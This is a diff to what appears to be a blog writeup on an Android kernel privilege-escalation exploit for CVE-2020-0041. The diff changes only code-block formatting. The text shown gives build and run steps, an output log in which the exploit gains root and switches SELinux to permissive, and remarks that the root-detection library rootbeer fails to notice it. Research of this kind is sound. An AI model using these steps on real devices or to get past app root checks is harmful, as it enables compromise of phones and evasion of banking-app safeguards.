@@ -139,7 +139,7 @@ void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
 
 *The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:*
 
-{{< code language="bash" title="Executing the root exploit" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
+```bash
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -180,7 +180,7 @@ uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 root_by_cve-2020-0041:/ # getenforce
 Permissive
 root_by_cve-2020-0041:/ # 
-{{< /code >}}
+``````
 
 I usually run run [rootbeer](https://play.google.com/store/apps/details?id=com.scottyab.rootbeer.sample&hl=es_419&gl=US) sample app for a fast root detection test. Despite this third party library is not using the same detection methods as banking applications is a good way to get an idea of how much your rooted device is hidden. Rootbeer was not able to detect root while using this privilege escalation exploit.
 
